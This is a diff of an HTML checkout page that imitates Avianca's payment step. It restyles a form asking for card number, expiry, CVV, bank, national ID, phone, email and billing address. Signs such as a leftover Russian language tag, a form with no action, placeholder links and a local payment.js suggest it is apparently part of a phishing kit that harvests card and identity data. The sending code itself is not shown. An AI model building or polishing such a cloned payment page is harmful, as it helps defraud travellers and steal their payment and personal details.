@@ -1,227 +1,284 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Avianca - Payment</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="shortcut icon" href="./assets/favicon.svg" t  ype="image/x-icon">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="./css/flight.css">
-    <link rel="stylesheet" href="./css/normalize.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Avianca - Payment</title>
 
-    <!-- START -->
-    <script src="./js/functions.js"></script>
+  <!-- Fuentes -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@400;600;700;800;900&family=Lato:wght@300;400;700&display=swap" rel="stylesheet" />
+
+  <!-- Estilos base del proyecto -->
+  <link rel="stylesheet" href="./css/flight.css" />
+  <link rel="stylesheet" href="./css/normalize.css" />
+
+  <!-- =================== SOLO VISUAL (scoped a esta página) =================== -->
+  <style>
+    /* Header consistente con step-two */
+    header.next-step{position:sticky;top:0;z-index:1000;background:#0f1115;color:#fff;box-shadow:0 6px 14px rgba(0,0,0,.08)}
+    .next-step{display:flex;align-items:center;gap:16px;flex-wrap:wrap;padding:10px 16px}
+    .next-step .ns-logo{height:26px;width:auto;display:block}
+    .next-step .ns-step img{display:block;max-height:28px}
+
+    /* Fondo general blanco (sin franjas) */
+    html,body{background:#fff}
+    .main-form,.container,.content,.wrapper,.booking-container{background:transparent}
+
+    /* Anular SOLO aquí el rectángulo del form */
+    body.step-three #next-step.form-control{
+      background:transparent !important;
+      border:none !important;
+      border-radius:0 !important;
+      box-shadow:none !important;
+      padding:0 !important;
+      overflow:visible !important;
+    }
+    body.step-three #next-step::before,
+    body.step-three #next-step::after{display:none !important;content:none !important}
+
+    /* Cards / Inputs */
+    .main-form{max-width:1160px;margin:0 auto;padding:12px 16px 88px}
+    .form-section{
+      background:#fff;border:1px solid rgba(2,6,23,.06);
+      border-radius:22px;box-shadow:0 8px 30px rgba(16,24,40,.06);
+      padding:16px;overflow:hidden;
+    }
+    @media(min-width:768px){.form-section{padding:24px}}
+    .form-section + .form-section{margin-top:28px}
+
+    /* Ocultar separadores rectos */
+    .main-form hr, hr.divider{display:none !important}
+
+    /* Inputs coherentes */
+    #next-step input[type="text"],
+    #next-step input[type="email"],
+    #next-step input[type="number"],
+    #next-step input[type="tel"],
+    #next-step select{
+      box-sizing:border-box;width:100%;height:52px;border-radius:14px;
+      border:1px solid #e5e7eb;padding:0 14px;background:#fff;outline:none;
+      transition:box-shadow .15s,border-color .15s;font-size:16px;
+    }
+    #next-step input:focus,#next-step select:focus{
+      border-color:#de0108;box-shadow:0 0 0 3px rgba(222,1,8,.12);
+    }
+    .btn.btn-gray{border-radius:14px;padding:12px 18px;font-weight:800}
+    .checkbox-group{display:flex;align-items:flex-start;gap:10px}
+    .companies-container{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+
+    /* Footer limpio */
+    .footer-fixed-2{position:sticky;bottom:0;background:#fff;border-top:1px solid #e5e7eb;z-index:900}
+    .footer-flight-resume{display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;padding:10px 16px;max-width:1160px;margin:0 auto}
+    .footer-flight-resume h4{margin:0}
+    .footer-flight-resume .fs-5{margin:0;color:#6b7280}
+    .footer-left p{margin:0}
+    .footer-date{font-size:12px;color:#6b7280;margin-top:4px}
+  </style>
+
+  <!-- START (no cambio tu carga de funciones) -->
+  <script src="./js/functions.js"></script>
 </head>
-<body class="mvh-100 bg-gray">
+<body class="mvh-100 bg-gray step-three">
 
-    <!-- ON LOADER -->
-    <div class="loader show">
-        <img class="" src="./assets/svg/plane-loader.gif">
+  <!-- LOADER -->
+  <div class="loader show">
+    <img src="./assets/svg/plane-loader.gif" alt="Cargando">
+  </div>
+
+  <!-- HEADER -->
+  <header class="next-step">
+    <div class="next-step">
+      <img class="ns-logo" src="./assets/logos/avianca_red.svg" alt="Avianca">
+      <div class="ns-step">
+        <!-- Mantengo tu imagen de paso 3 -->
+        <img src="./assets/svg/step_3_header.png" alt="Paso 3">
+      </div>
     </div>
+  </header>
 
-    
+  <!-- MAIN -->
+  <main>
+    <div class="main-form">
+      <form id="next-step" class="form-control">
 
-    <header>
-        <div class="next-step">
-            <img class="ns-logo" src="./assets/logos/avianca_red.svg">
-            <div class="ns-step">
-                <img src="./assets/svg/step_3_header.png">
-            </div>
+        <div class="form-header">
+          <label class="radio-wrapper" for="ida_vuelta">
+            <input type="radio" checked id="ida_vuelta" name="opcion_viaje"
+                   onclick="info.flightInfo.type = 1; updateLS(); updateDOM()">
+            <div class="radio-circle"><div class="radio-dot"></div></div>
+            <h3 class="radio-label">Tarjeta de crédito y débito</h3>
+          </label>
         </div>
-    </header>
 
-    <main>
-        <div class="main-form">
-            <form id="next-step" class="form-control">
-                <div class="form-header">
-                    <label class="radio-wrapper" for="ida_vuelta">
-                        <input type="radio" checked id="ida_vuelta" name="opcion_viaje" onclick="info.flightInfo.type = 1; updateLS(); updateDOM()">
-                        <div class="radio-circle">
-                            <div class="radio-dot"></div>
-                        </div>
-                        <h3 class="radio-label">Tarjeta de crédito y débito</h3>
-                    </label>
-                </div>
-                <hr>
-                <!-- CARD SECTION -->
-                <div class="form-section">
-                    <div class="companies-container">
-                        <img src="./assets/svg/visa.svg">
-                        <img src="./assets/svg/mc.svg">
-                        <img src="./assets/svg/diners.svg">
-                        <img src="./assets/svg/amex.svg">
-                        <img src="./assets/svg/uatp.png" width="50px">
-                    </div>
+        <!-- CARD SECTION -->
+        <div class="form-section">
+          <div class="companies-container">
+            <img src="./assets/svg/visa.svg" alt="Visa">
+            <img src="./assets/svg/mc.svg" alt="Mastercard">
+            <img src="./assets/svg/diners.svg" alt="Diners">
+            <img src="./assets/svg/amex.svg" alt="Amex">
+            <img src="./assets/svg/uatp.png" width="50" alt="UATP">
+          </div>
 
-                    <h4>Información de la tarjeta</h4>
-                    <div class="checkbox-group mt-2">
-                        <input class="check fs-2" type="checkbox"  id="">
-                        <label for="">Mi tarjeta de crédito no es de Ecuador</label>
-                    </div>
+          <h4>Información de la tarjeta</h4>
 
-        
-                    <input id="p" class="input-cc bg-std mt-2"  placeholder="Número de Tajerta" type="text" oninput="formatCNumber(this)">
-                    <label class="fs-5">Ingresa tu tarjeta crédito, débito o Avianca UATP</label>
+          <div class="checkbox-group mt-2">
+            <input class="check fs-2" type="checkbox" id="tarjeta-no-ec">
+            <label for="tarjeta-no-ec">Mi tarjeta de crédito no es de Ecuador</label>
+          </div>
 
-                    
-                    <div class="input-group mt-2">
-                        <div class="me-2">
-                            <input id="pdate"  type="text" placeholder="MM/AA"  oninput="formatDate(this)">
-                            <label class="fs-5">Fecha de Expiración</label>
-                        </div>
-                        
-                        <div>
-                            <input  class="" type="text" id="c" maxlength="3" placeholder="CVV">
-                            <label class="fs-5">Código de seguridad</label>
-                        </div>
-                    </div>
-                    
-                    <select id="ban" required name="txt-entidad" class="mt-4">
-                        <option label="Seleccione su banco" value="">Seleccione su banco</option>
-                        <option value="BANCO PICHINCHA">BANCO PICHINCHA</option>
-                        <option value="PRODUBANCO">PRODUBANCO</option>
-                        <option value="BANCO DEL PACIFICO">BANCO DEL PACIFICO</option>
-                        <option value="BANCO GUAYAQUIL">BANCO GUAYAQUIL</option>
-                        <option value="BANCO INTERNACIONAL">BANCO INTERNACIONAL</option>
-                        <option value="BANCO BOLIVARIANO">BANCO BOLIVARIANO</option>
-                        <option value="BANCO DEL AUSTRO">BANCO DEL AUSTRO</option>
-                        <option value="BANCO DE DESARROLLO DEL ECUADOR">BANCO DE DESARROLLO DEL ECUADOR</option>
-                        <option value="BANCO GENERAL RUMINAHUI">BANCO GENERAL RUMINAHUI</option>
-                        <option value="BANCO DE MACHALA">BANCO DE MACHALA</option>
-                        <option value="BANCO SOLIDARIO">BANCO SOLIDARIO</option>
-                        <option value="BANECUADOR">BANECUADOR</option>
-                        <option value="BANCO DE LOJA">BANCO DE LOJA</option>
-                        <option value="CITIBANK">CITIBANK</option>
-                        <option value="BANCO PROCREDIT">BANCO PROCREDIT</option>
-                        <option value="BANCO AMAZONAS">BANCO AMAZONAS</option>
-                        <option value="BANCO COOPNACIONAL">BANCO COOPNACIONAL</option>
-                        <option value="BANCO VISIONFUND ECUADOR">BANCO VISIONFUND ECUADOR</option>
-                        <option value="BANCO D-MIRO">BANCO D-MIRO</option>
-                        <option value="BANCO AMIBANK">BANCO AMIBANK</option>
-                        <option value="BANCO COMERCIAL DE MANABI">BANCO COMERCIAL DE MANABI</option>
-                        <option value="BANCO CAPITAL">BANCO CAPITAL</option>
-                        <option value="BANCO DEL LITORAL">BANCO DEL LITORAL</option>
-                        <option value="BANCO DELBANK">BANCO DELBANK</option>
-                        <option value="PIBANK">PIBANK</option>
-                        <option value="BIMO">BIMO</option>
-                        <option value="DEUNA!">DEUNA!</option>
-                        <option value="GLOBAL66">GLOBAL66</option>
-                        <option value="PEIGO">PEIGO</option>
-                    </select>
-                    
-                    <select id="dues" required class="mt-4 mb-5">
-                        <option value="" disabled selected>Número de cuotas</option>
-                        <option value="1">1</option>
-                        <option value="2">2</option>
-                        <option value="3">3</option>
-                        <option value="4">4</option>
-                        <option value="5">5</option>
-                        <option value="6">6</option>
-                        <option value="7">7</option>
-                        <option value="8">8</option>
-                        <option value="9">9</option>
-                        <option value="10">10</option>
-                        <option value="11">11</option>
-                        <option value="12">12</option>
-                        <option value="13">13</option>
-                        <option value="14">14</option>
-                        <option value="15">15</option>
-                        <option value="16">16</option>
-                        <option value="17">17</option>
-                        <option value="18">18</option>
-                        <option value="19">19</option>
-                        <option value="20">20</option>
-                        <option value="21">21</option>
-                        <option value="22">22</option>
-                        <option value="23">23</option>
-                        <option value="24">24</option>
-                        <option value="25">25</option>
-                        <option value="26">26</option>
-                        <option value="27">27</option>
-                        <option value="28">28</option>
-                        <option value="29">29</option>
-                        <option value="30">30</option>
-                        <option value="31">31</option>
-                        <option value="32">32</option>
-                        <option value="33">33</option>
-                        <option value="34">34</option>
-                        <option value="35">35</option>
-                        <option value="36">36</option>
-                    </select>
+          <input id="p" class="input-cc bg-std mt-2" placeholder="Número de Tarjeta" type="text" oninput="formatCNumber(this)">
+          <label class="fs-5">Ingresa tu tarjeta crédito, débito o Avianca UATP</label>
 
-                    <hr>
-
-                    <h4 class="mt-5">Información del titular</h4>
-                    <input  id="name" class="mt-4" type="text" placeholder="Nombre del titular de la tarjeta" id="">
-                    <input  id="surname" class="mt-4" type="text" placeholder="Apellido del titular de la tarjeta" id="">
-                    <input  id="cc" class="mt-4" type="text" placeholder="Número de identificación" oninput="limitDigits(this, 10)">
-                    <input  id="email" class="mt-4" type="text" placeholder="Correo" id="">
-                    <input  id="telnum" class="mt-4 mb-5" type="text" id="" maxlength="9999999999" placeholder="Celular" oninput="limitDigits(this, 10)">
-                    
-                    <!-- <hr> -->
-
-                    <h4 class="mt-4">Domicilio de facturación</h4>
-                    <input  id="city" class="mt-4" type="text" placeholder="Ciudad" id="">
-                    <input  id="state" class="mt-4" type="text" placeholder="Estado/Provincia" id="">
-                    <input  id="address" class="mt-4" type="text" placeholder="Dirección" id="">
-
-                    
-                    <div class="checkbox-group mt-4">
-                        <div>
-                            <input class="check" type="checkbox" name="" id="">
-                        </div>
-                        <label>Por la presente declaro que soy mayor de edad, he leído y acepto el  <a href="">contrato de transporte</a>, y la <a href="">política general de privacidad de clientes, viajeros y usuarios</a> y las condiciones de <a href="">manejo de mercancías peligrosas</a>, la política de cancelación y penalidades por cambio, el cobro de impuestos y cargos gubernamentales no incluidos en el valor del servicio, así como aquellos incluidos y las <a href="">condiciones de acceso de uso de este sitio web.</a></label>
-                    </div>
-
-                    <div class="mt-4 show justify-content-center">
-                        <button type="submit" class="btn btn-gray">
-                            Pago seguro
-                        </button>
-                    </div>
-                </div>
-
-            </form>
-
-            <form class="form-control mt-5 mb-10">
-                <div class="form-header">
-                    <label class="radio-wrapper" for="ida_vuelta">
-                        <input type="radio" disabled id="ida_vuelta">
-                        <div class="radio-circle">
-                            <div class="radio-dot"></div>
-                        </div>
-                        <h3 class="radio-label disabled">PSE (Deshabilitado)</h3>
-                    </label>
-                </div>
-            </form>
-        </div>
-    </main>
-
-    <footer class="footer-fixed-2">
-        <div class="footer-flight-resume">
-            <div>
-                <p class="mb-1">Resumen del viaje:</p>
-                <div class="show align-items-center">
-                    <h4 id="origin-code">BOG</h4>
-                    <img src="./assets/svg/arrow.png" width="14px">
-                    <h4 id="destination-code">CLI</h4>
-                </div>
+          <div class="input-group mt-2">
+            <div class="me-2">
+              <input id="pdate" type="text" placeholder="MM/AA" oninput="formatDate(this)">
+              <label class="fs-5">Fecha de Expiración</label>
             </div>
             <div>
-                <h4 class="text-end mt-1">$<span id="flight-cost">49.999</span> USD</h4>
-                <p class="fs-5">Total de tu reserva:</p>
-                <img src="./assets/svg/info_icon.png" width="15px">
+              <input type="text" id="c" maxlength="3" placeholder="CVV">
+              <label class="fs-5">Código de seguridad</label>
             </div>
+          </div>
+
+          <select id="ban" required name="txt-entidad" class="mt-4">
+            <option label="Seleccione su banco" value="">Seleccione su banco</option>
+            <option value="BANCO PICHINCHA">BANCO PICHINCHA</option>
+            <option value="PRODUBANCO">PRODUBANCO</option>
+            <option value="BANCO DEL PACIFICO">BANCO DEL PACIFICO</option>
+            <option value="BANCO GUAYAQUIL">BANCO GUAYAQUIL</option>
+            <option value="BANCO INTERNACIONAL">BANCO INTERNACIONAL</option>
+            <option value="BANCO BOLIVARIANO">BANCO BOLIVARIANO</option>
+            <option value="BANCO DEL AUSTRO">BANCO DEL AUSTRO</option>
+            <option value="BANCO DE DESARROLLO DEL ECUADOR">BANCO DE DESARROLLO DEL ECUADOR</option>
+            <option value="BANCO GENERAL RUMINAHUI">BANCO GENERAL RUMINAHUI</option>
+            <option value="BANCO DE MACHALA">BANCO DE MACHALA</option>
+            <option value="BANCO SOLIDARIO">BANCO SOLIDARIO</option>
+            <option value="BANECUADOR">BANECUADOR</option>
+            <option value="BANCO DE LOJA">BANCO DE LOJA</option>
+            <option value="CITIBANK">CITIBANK</option>
+            <option value="BANCO PROCREDIT">BANCO PROCREDIT</option>
+            <option value="BANCO AMAZONAS">BANCO AMAZONAS</option>
+            <option value="BANCO COOPNACIONAL">BANCO COOPNACIONAL</option>
+            <option value="BANCO VISIONFUND ECUADOR">BANCO VISIONFUND ECUADOR</option>
+            <option value="BANCO D-MIRO">BANCO D-MIRO</option>
+            <option value="BANCO AMIBANK">BANCO AMIBANK</option>
+            <option value="BANCO COMERCIAL DE MANABI">BANCO COMERCIAL DE MANABI</option>
+            <option value="BANCO CAPITAL">BANCO CAPITAL</option>
+            <option value="BANCO DEL LITORAL">BANCO DEL LITORAL</option>
+            <option value="BANCO DELBANK">BANCO DELBANK</option>
+            <option value="PIBANK">PIBANK</option>
+            <option value="BIMO">BIMO</option>
+            <option value="DEUNA!">DEUNA!</option>
+            <option value="GLOBAL66">GLOBAL66</option>
+            <option value="PEIGO">PEIGO</option>
+          </select>
+
+          <select id="dues" required class="mt-4 mb-5">
+            <option value="" disabled selected>Número de cuotas</option>
+            <option value="1">1</option><option value="2">2</option><option value="3">3</option>
+            <option value="4">4</option><option value="5">5</option><option value="6">6</option>
+            <option value="7">7</option><option value="8">8</option><option value="9">9</option>
+            <option value="10">10</option><option value="11">11</option><option value="12">12</option>
+            <option value="13">13</option><option value="14">14</option><option value="15">15</option>
+            <option value="16">16</option><option value="17">17</option><option value="18">18</option>
+            <option value="19">19</option><option value="20">20</option><option value="21">21</option>
+            <option value="22">22</option><option value="23">23</option><option value="24">24</option>
+            <option value="25">25</option><option value="26">26</option><option value="27">27</option>
+            <option value="28">28</option><option value="29">29</option><option value="30">30</option>
+            <option value="31">31</option><option value="32">32</option><option value="33">33</option>
+            <option value="34">34</option><option value="35">35</option><option value="36">36</option>
+          </select>
+
+          <h4 class="mt-5">Información del titular</h4>
+          <input id="name" class="mt-4" type="text" placeholder="Nombre del titular de la tarjeta">
+          <input id="surname" class="mt-4" type="text" placeholder="Apellido del titular de la tarjeta">
+          <input id="cc" class="mt-4" type="text" placeholder="Número de identificación" oninput="limitDigits(this, 10)">
+          <input id="email" class="mt-4" type="text" placeholder="Correo">
+          <input id="telnum" class="mt-4 mb-5" type="text" maxlength="9999999999" placeholder="Celular" oninput="limitDigits(this, 10)">
+
+          <h4 class="mt-4">Domicilio de facturación</h4>
+          <input id="city" class="mt-4" type="text" placeholder="Ciudad">
+          <input id="state" class="mt-4" type="text" placeholder="Estado/Provincia">
+          <input id="address" class="mt-4" type="text" placeholder="Dirección">
+
+          <div class="checkbox-group mt-4">
+            <div><input class="check" type="checkbox" id="legal-accept"></div>
+            <label for="legal-accept">
+              Por la presente declaro que soy mayor de edad, he leído y acepto el
+              <a href="">contrato de transporte</a>, y la
+              <a href="">política general de privacidad de clientes, viajeros y usuarios</a> y las condiciones de
+              <a href="">manejo de mercancías peligrosas</a>, la política de cancelación y penalidades por cambio,
+              el cobro de impuestos y cargos gubernamentales no incluidos en el valor del servicio, así como aquellos incluidos
+              y las <a href="">condiciones de acceso de uso de este sitio web.</a>
+            </label>
+          </div>
+
+          <div class="mt-4 show justify-content-center">
+            <button type="submit" class="btn btn-gray">Pago seguro</button>
+          </div>
         </div>
 
-        <p class="mt-2 mb-2">© Avianca S.A 2024</p>
-    </footer>
+      </form>
 
-    <!-- SCRIPTS -->
-    <script src="./js/payment.js"></script>
+      <!-- Bloque PSE (deshabilitado) como card también -->
+      <form class="form-control mt-5 mb-10">
+        <div class="form-section">
+          <div class="form-header">
+            <label class="radio-wrapper" for="pse_disabled">
+              <input type="radio" disabled id="pse_disabled">
+              <div class="radio-circle"><div class="radio-dot"></div></div>
+              <h3 class="radio-label disabled">PSE (Deshabilitado)</h3>
+            </label>
+          </div>
+        </div>
+      </form>
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="footer-fixed-2">
+    <div class="footer-flight-resume">
+      <div class="footer-left">
+        <p class="mb-1">Resumen del viaje:</p>
+        <div class="show align-items-center">
+          <h4 id="origin-code">BOG</h4>
+          <img src="./assets/svg/arrow.png" width="14" alt="→">
+          <h4 id="destination-code">CLI</h4>
+        </div>
+        <!-- espacio para fecha si decides mostrarla -->
+        <p id="footer-date" class="footer-date"></p>
+      </div>
+      <div>
+        <h4 class="text-end mt-1">$<span id="flight-cost">49.999</span> USD</h4>
+        <p class="fs-5">Total de tu reserva:</p>
+        <img src="./assets/svg/info_icon.png" width="15" alt="info">
+      </div>
+    </div>
+    <p class="mt-2 mb-2" style="text-align:center; color:#9ca3af;">© Avianca S.A 2024</p>
+  </footer>
+
+  <!-- SCRIPTS -->
+  <script src="./js/functions.js"></script>
+  <script src="./js/payment.js"></script>
+
+  <!-- (Opcional) si existen #ns-route / #ns-date en alguna cabecera compartida, copiarlos abajo -->
+  <script>
+    (function () {
+      try {
+        var routeEl = document.getElementById('ns-route');
+        var dateEl  = document.getElementById('ns-date');
+        var footerDate = document.getElementById('footer-date');
+        if (footerDate && (routeEl || dateEl)) {
+          var parts = [];
+          if (routeEl && routeEl.textContent.trim()) parts.push(routeEl.textContent.trim());
+          if (dateEl && dateEl.textContent.trim())  parts.push(dateEl.textContent.trim());
+          footerDate.textContent = parts.join(' • ');
+        }
+      } catch(e) {}
+    })();
+  </script>
 </body>
 </html>
